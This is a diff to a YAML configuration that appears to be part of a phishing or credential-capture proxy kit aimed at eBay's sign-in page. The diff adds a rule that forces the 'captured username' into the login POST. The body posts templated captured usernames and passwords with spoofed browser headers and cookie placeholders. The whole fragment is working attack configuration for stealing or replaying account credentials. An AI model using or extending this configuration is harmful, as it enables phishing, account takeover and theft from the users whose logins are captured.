@@ -157,6 +157,9 @@ force_post:
   - domain: 'signin.ebay.com'
     path: '/ws/eBayISAPI.dll?SignIn'
     type: post
+    force:
+      search: 'userid'     # Specify what to search for to enforce
+      replace: '{{credentials.username}}'  # Replace with captured username
     headers:
       Content-Type: 'application/x-www-form-urlencoded'
       User-Agent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
@@ -166,12 +169,13 @@ force_post:
       Connection: 'keep-alive'
       Referer: 'https://www.ebay.com/signin'
       Origin: 'https://signin.ebay.com'
-      Dnt: '1'  # Do Not Track header
-      Cookie: 's=your_session_cookie_here; dp1=your_dp1_cookie_here; npii=your_npii_cookie_here'  # Example cookies, replace with actual ones
+      Dnt: '1'
+      Cookie: 's=your_session_cookie_here; dp1=your_dp1_cookie_here; npii=your_npii_cookie_here'
       Cache-Control: 'max-age=0'
     body:
       - { key: 'userid', value: '{{credentials.username}}' }
       - { key: 'pass', value: '{{credentials.password}}' }
+
 
 credentials:
   username:
